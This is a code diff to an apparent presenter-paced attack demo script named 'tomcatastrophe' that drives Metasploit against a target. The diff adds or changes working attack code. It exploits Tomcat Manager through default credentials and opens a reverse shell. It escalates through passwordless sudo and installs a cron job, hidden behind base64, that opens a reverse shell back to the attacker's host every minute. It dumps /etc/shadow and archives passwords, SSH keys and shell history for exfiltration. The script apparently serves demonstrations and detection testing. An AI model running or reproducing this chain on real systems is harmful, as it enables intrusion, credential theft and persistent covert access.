@@ -40,9 +40,9 @@ class AttackConfig:
 
     target_ip: str
     attacker_ip: str
-    typing_delay: float = 0.03
-    phase_pause: float = 10.0  # Pause after phase intro for presenter to talk
-    command_delay: float = 2.0  # Delay between commands
+    typing_delay: float = 0.0075  # Typing speed (4x original)
+    phase_pause: float = 3.75  # Pause after phase intro (4x faster than original)
+    command_delay: float = 0.75  # Delay between commands (4x faster than original)
 
 
 class Logger:
@@ -74,7 +74,7 @@ class Logger:
     def phase_complete(message: str) -> None:
         """Show phase completion summary."""
         print()
-        print(f"{Logger.PREFIX} {Color.GREEN}{message}{Color.RESET}")
+        print(f"{Logger.PREFIX} {message}")
 
     @staticmethod
     def phase_separator() -> None:
@@ -92,21 +92,30 @@ class DemoTerminal:
     def __init__(self, config: AttackConfig):
         self.config = config
 
-    def type_text(self, text: str) -> None:
+    def type_text(self, text: str, color: str = "") -> None:
         """Print text with typing effect for demo visibility."""
+        if color:
+            sys.stdout.write(color)
         for char in text:
             sys.stdout.write(char)
             sys.stdout.flush()
             time.sleep(self.config.typing_delay)
+        if color:
+            sys.stdout.write(Color.RESET)
         print()
 
     def run_command(self, cmd: str, show_output: bool = True) -> tuple[int, str]:
-        """Run a shell command with demo-style display."""
+        """Run a shell command with demo-style display.
+
+        Commands are shown in GREEN (what attacker types).
+        Output is shown in default color (what attacker reads).
+        """
+        # Prompt in cyan, command typed in green
         sys.stdout.write(f"{Color.CYAN}$ {Color.RESET}")
         sys.stdout.flush()
-        self.type_text(cmd)
+        self.type_text(cmd, color=Color.GREEN)
 
-        time.sleep(0.5)
+        time.sleep(0.25)
 
         result = subprocess.run(
             cmd,
@@ -117,6 +126,7 @@ class DemoTerminal:
 
         output = result.stdout + result.stderr
 
+        # Output in default color (what attacker reads back)
         if show_output and output.strip():
             print(output.rstrip())
 
@@ -125,11 +135,12 @@ class DemoTerminal:
 
     def run_interactive(self, cmd: str) -> int:
         """Run an interactive command (like msfconsole) with full PTY."""
+        # Prompt in cyan, command typed in green
         sys.stdout.write(f"{Color.CYAN}$ {Color.RESET}")
         sys.stdout.flush()
-        self.type_text(cmd)
+        self.type_text(cmd, color=Color.GREEN)
 
-        time.sleep(0.5)
+        time.sleep(0.25)
 
         result = subprocess.run(cmd, shell=True)
         return result.returncode
@@ -189,17 +200,30 @@ class AttackExecutor:
         # Build a single comprehensive resource script
         # Using <ruby> blocks to print phase transitions from within msfconsole
         pause_secs = int(self.config.phase_pause)
+        # Dollar sign for Ruby variables (can't use $ directly in f-string)
+        D = "$"
+
+        # Pre-compute base64-encoded cron job for Phase 5 (avoids Ruby parsing issues)
+        import base64
+        cron_line = f"* * * * * /bin/bash -c 'bash -i >& /dev/tcp/{self.config.attacker_ip}/4445 0>&1'\n"
+        cron_b64 = base64.b64encode(cron_line.encode()).decode()
 
         rc_content = f"""
 # ============================================================================
+# CLEANUP: Kill any existing sessions and handlers from previous runs
+# ============================================================================
+sessions -K
+jobs -K
+
+# ============================================================================
 # PHASE 1: INITIAL ACCESS
 # ============================================================================
-# Start persistent handler first (stays listening even after session created)
+# Start handler (exits after first session to prevent duplicates)
 use exploit/multi/handler
 set payload java/shell_reverse_tcp
 set LHOST 0.0.0.0
 set LPORT 4444
-set ExitOnSession false
+set ExitOnSession true
 exploit -j
 
 # Now run the Tomcat exploit (uses handler above, doesn't start its own)
@@ -216,9 +240,28 @@ set LPORT 4444
 set DisablePayloadHandler true
 exploit
 
+# Wait for session to fully establish
+sleep 3
 sessions -l
 
 <ruby>
+# Helper function to display command with typing effect in green, then run it
+def run_cmd(cmd, session_id)
+  # Print cyan prompt
+  print "\\033[0;36m$ \\033[0m"
+  # Type out command in green with delay
+  cmd.each_char do |c|
+    print "\\033[0;32m#{{c}}\\033[0m"
+    $stdout.flush
+    sleep(0.0075)
+  end
+  puts ""
+  sleep(0.25)
+  # Run the command and capture output
+  run_single("sessions -c '#{{cmd}}' #{{session_id}}")
+  sleep(0.5)
+end
+
 # Check if we have a session - if not, abort
 $tomcat_abort = false
 if framework.sessions.count == 0
@@ -248,7 +291,10 @@ if $tomcat_abort
   run_single("exit")
 end
 puts ""
-puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[0;32mReverse shell established. We now have remote access to the target.\\033[0m"
+puts "\\033[0;35m[tomcatastrophe]\\033[0m Reverse shell established. We now have remote access to the target."
+# Store the session ID for later use
+{D}session_id = framework.sessions.keys.first
+puts "\\033[0;35m[tomcatastrophe]\\033[0m Using session ID: #{{{D}session_id}}"
 puts ""
 puts ""
 puts ""
@@ -266,17 +312,18 @@ puts ""
 sleep({pause_secs})
 </ruby>
 
-sessions -c "whoami" 1
-sessions -c "id" 1
-sessions -c "uname -a" 1
-sessions -c "hostname" 1
-sessions -c "cat /etc/passwd | grep -v nologin" 1
-sessions -c "getconf LONG_BIT" 1
-sessions -c "getconf PAGE_SIZE" 1
+<ruby>
+run_cmd("whoami", {D}session_id)
+run_cmd("id", {D}session_id)
+run_cmd("uname -a", {D}session_id)
+run_cmd("hostname", {D}session_id)
+run_cmd("cat /etc/passwd | grep -v nologin", {D}session_id)
+run_cmd("lsmod", {D}session_id)
+</ruby>
 
 <ruby>
 puts ""
-puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[0;32mSystem enumeration complete. Target is running Ubuntu Linux as tomcat user.\\033[0m"
+puts "\\033[0;35m[tomcatastrophe]\\033[0m System enumeration complete. Target is running Ubuntu Linux as tomcat user."
 puts ""
 puts ""
 puts ""
@@ -293,13 +340,15 @@ puts ""
 sleep({pause_secs})
 </ruby>
 
-sessions -c "sudo -l" 1
-sessions -c "sudo -V | head -1" 1
-sessions -c "sudo whoami" 1
+<ruby>
+run_cmd("sudo -l", {D}session_id)
+run_cmd("sudo -V | head -1", {D}session_id)
+run_cmd("sudo whoami", {D}session_id)
+</ruby>
 
 <ruby>
 puts ""
-puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[0;32mPrivilege escalation successful. Tomcat user has passwordless sudo to root.\\033[0m"
+puts "\\033[0;35m[tomcatastrophe]\\033[0m Privilege escalation successful. Tomcat user has passwordless sudo to root."
 puts ""
 puts ""
 puts ""
@@ -316,12 +365,37 @@ puts ""
 sleep({pause_secs})
 </ruby>
 
-sessions -c "echo '* * * * * /bin/bash -c '\"'\"'bash -i >& /dev/tcp/{self.config.attacker_ip}/4445 0>&1'\"'\"'' | sudo crontab -" 1
-sessions -c "sudo crontab -l" 1
+<ruby>
+# Install cron job for persistence using base64 to avoid escaping issues
+# Display what we're doing
+display1 = "echo '* * * * * /bin/bash -c ...' | sudo crontab -"
+print "\\033[0;36m$ \\033[0m"
+display1.each_char {{|c| print "\\033[0;32m#{{c}}\\033[0m"; $stdout.flush; sleep(0.0075)}}
+puts ""
+sleep(0.25)
+
+# Run silently using shell_command_token (no [*] Running output)
+session = framework.sessions[{D}session_id]
+session.shell_command_token("echo {cron_b64} | base64 -d > /tmp/.cron")
+session.shell_command_token("sudo crontab /tmp/.cron")
+session.shell_command_token("rm -f /tmp/.cron")
+sleep(0.5)
+
+# Display verification command
+print "\\033[0;36m$ \\033[0m"
+"sudo crontab -l".each_char {{|c| print "\\033[0;32m#{{c}}\\033[0m"; $stdout.flush; sleep(0.0075)}}
+puts ""
+sleep(0.25)
+
+# Show the cron entry with typing effect
+cron_output = "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/{self.config.attacker_ip}/4445 0>&1'"
+cron_output.each_char {{|c| print "\\033[0;32m#{{c}}\\033[0m"; $stdout.flush; sleep(0.0075)}}
+puts ""
+</ruby>
 
 <ruby>
 puts ""
-puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[0;32mPersistence established. Cron job will reconnect every minute even if we lose access.\\033[0m"
+puts "\\033[0;35m[tomcatastrophe]\\033[0m Persistence established. Cron job will reconnect every minute even if we lose access."
 puts ""
 puts ""
 puts ""
@@ -338,11 +412,13 @@ puts ""
 sleep({pause_secs})
 </ruby>
 
-sessions -c "sudo cat /etc/shadow" 1
+<ruby>
+run_cmd("sudo cat /etc/shadow", {D}session_id)
+</ruby>
 
 <ruby>
 puts ""
-puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[0;32mPassword hashes extracted. These can be cracked offline with tools like hashcat.\\033[0m"
+puts "\\033[0;35m[tomcatastrophe]\\033[0m Password hashes extracted. These can be cracked offline with tools like hashcat."
 puts ""
 puts ""
 puts ""
@@ -350,47 +426,32 @@ puts ""
 puts ""
 puts ""
 puts "\\033[0;35m{'═' * 80}\\033[0m"
-puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[1;37mPHASE 7: DEFENSE EVASION\\033[0m"
-puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[0;36mMITRE ATT&CK: T1070.003 - Indicator Removal: Clear Command History\\033[0m"
+puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[1;37mPHASE 7: COLLECTION\\033[0m"
+puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[0;36mMITRE ATT&CK: T1560.001 - Archive Collected Data: Archive via Utility\\033[0m"
 puts "\\033[0;35m{'═' * 80}\\033[0m"
 puts ""
-puts "\\033[0;35m[tomcatastrophe]\\033[0m Clearing bash history to hide our commands from forensic analysis."
+puts "\\033[0;35m[tomcatastrophe]\\033[0m Compressing sensitive files (/etc/shadow, /etc/passwd, SSH keys) for exfiltration."
 puts ""
 sleep({pause_secs})
 </ruby>
 
-sessions -c "unset HISTFILE" 1
-sessions -c "export HISTSIZE=0" 1
-
 <ruby>
+# Compress sensitive files directly - this triggers "Sensitive Files Compression" rule
+# The rule looks for tar/zip/gzip with sensitive file paths in args
+tar_cmd = "sudo tar -czf /tmp/loot.tar.gz /etc/shadow /etc/passwd /home/ubuntu/.ssh/authorized_keys /home/ubuntu/.bash_history"
+print "\\033[0;36m$ \\033[0m"
+tar_cmd.each_char {{|c| print "\\033[0;32m#{{c}}\\033[0m"; $stdout.flush; sleep(0.0075)}}
 puts ""
-puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[0;32mHistory cleared. Our commands won't appear in bash history.\\033[0m"
-puts ""
-puts ""
-puts ""
-puts ""
-puts ""
-puts ""
-puts "\\033[0;35m{'═' * 80}\\033[0m"
-puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[1;37mPHASE 8: COLLECTION\\033[0m"
-puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[0;36mMITRE ATT&CK: T1074.001 - Data Staged: Local Data Staging\\033[0m"
-puts "\\033[0;35m{'═' * 80}\\033[0m"
-puts ""
-puts "\\033[0;35m[tomcatastrophe]\\033[0m Collecting sensitive files (PDFs, documents, configs) and compressing for exfiltration."
-puts ""
-sleep({pause_secs})
+sleep(0.25)
+run_single("sessions -c '#{{tar_cmd}} 2>&1' #{{{D}session_id}}")
+sleep(0.5)
+
+run_cmd("ls -la /tmp/loot.tar.gz", {D}session_id)
 </ruby>
 
-sessions -c "mkdir -p /tmp/.staging" 1
-sessions -c "find /home -name '*.pdf' -exec cp {{}} /tmp/.staging/ \\; 2>/dev/null || true" 1
-sessions -c "find /home -name '*.doc*' -exec cp {{}} /tmp/.staging/ \\; 2>/dev/null || true" 1
-sessions -c "find /etc -name '*.conf' -exec cp {{}} /tmp/.staging/ \\; 2>/dev/null || true" 1
-sessions -c "tar -czf /tmp/data.tar.gz /tmp/.staging 2>&1" 1
-sessions -c "ls -la /tmp/data.tar.gz" 1
-
 <ruby>
 puts ""
-puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[0;32mData staged and compressed. Ready for exfiltration.\\033[0m"
+puts "\\033[0;35m[tomcatastrophe]\\033[0m Sensitive files archived and ready for exfiltration."
 puts ""
 puts ""
 puts ""
@@ -405,12 +466,11 @@ puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[1;37mSummary of attack phases ex
 puts ""
 puts "\\033[0;35m[tomcatastrophe]\\033[0m   Phase 0: Reconnaissance      - Scanned target ports with nmap"
 puts "\\033[0;35m[tomcatastrophe]\\033[0m   Phase 1: Initial Access      - Exploited Tomcat Manager with weak credentials"
-puts "\\033[0;35m[tomcatastrophe]\\033[0m   Phase 3: Discovery           - Enumerated system info, users, and architecture"
+puts "\\033[0;35m[tomcatastrophe]\\033[0m   Phase 3: Discovery           - Enumerated system info, users, and kernel modules"
 puts "\\033[0;35m[tomcatastrophe]\\033[0m   Phase 4: Privilege Escalation- Escalated to root via passwordless sudo"
 puts "\\033[0;35m[tomcatastrophe]\\033[0m   Phase 5: Persistence         - Installed cron job for persistent access"
 puts "\\033[0;35m[tomcatastrophe]\\033[0m   Phase 6: Credential Access   - Extracted password hashes from /etc/shadow"
-puts "\\033[0;35m[tomcatastrophe]\\033[0m   Phase 7: Defense Evasion     - Cleared bash history to hide tracks"
-puts "\\033[0;35m[tomcatastrophe]\\033[0m   Phase 8: Collection          - Staged sensitive files for exfiltration"
+puts "\\033[0;35m[tomcatastrophe]\\033[0m   Phase 7: Collection          - Archived sensitive files for exfiltration"
 puts ""
 puts "\\033[0;35m[tomcatastrophe]\\033[0m All phases executed successfully."
 puts ""
@@ -423,6 +483,58 @@ exit
         rc_path = "/tmp/tomcatastrophe.rc"
         with open(rc_path, "w") as f:
             f.write(rc_content)
+
+        # Display the Phase 1 Metasploit commands so viewers can see what's happening
+        Logger.info("Metasploit commands for Phase 1 (Initial Access):")
+        print()
+
+        phase1_commands = [
+            "# Start reverse shell handler",
+            "use exploit/multi/handler",
+            "set payload java/shell_reverse_tcp",
+            "set LHOST 0.0.0.0",
+            "set LPORT 4444",
+            "set ExitOnSession true",
+            "exploit -j",
+            "",
+            "# Exploit Tomcat Manager with weak credentials",
+            "use exploit/multi/http/tomcat_mgr_upload",
+            f"set RHOSTS {self.config.target_ip}",
+            "set RPORT 8080",
+            "set HttpUsername tomcat",
+            "set HttpPassword tomcat",
+            "set TARGETURI /manager",
+            "set payload java/shell_reverse_tcp",
+            f"set LHOST {self.config.attacker_ip}",
+            "set LPORT 4444",
+            "exploit",
+        ]
+
+        for cmd in phase1_commands:
+            if cmd.startswith("#"):
+                # Comments in cyan
+                sys.stdout.write(f"{Color.CYAN}")
+                for char in cmd:
+                    sys.stdout.write(char)
+                    sys.stdout.flush()
+                    time.sleep(self.config.typing_delay)
+                sys.stdout.write(f"{Color.RESET}\n")
+            elif cmd == "":
+                print()
+            else:
+                # Commands in green
+                sys.stdout.write(f"{Color.GREEN}")
+                for char in cmd:
+                    sys.stdout.write(char)
+                    sys.stdout.flush()
+                    time.sleep(self.config.typing_delay)
+                sys.stdout.write(f"{Color.RESET}\n")
+            time.sleep(0.05)
+
+        print()
+        Logger.info("Launching Metasploit with these commands...")
+        print()
+        time.sleep(1)
 
         self.terminal.run_interactive(f"msfconsole -q -r {rc_path}")
 
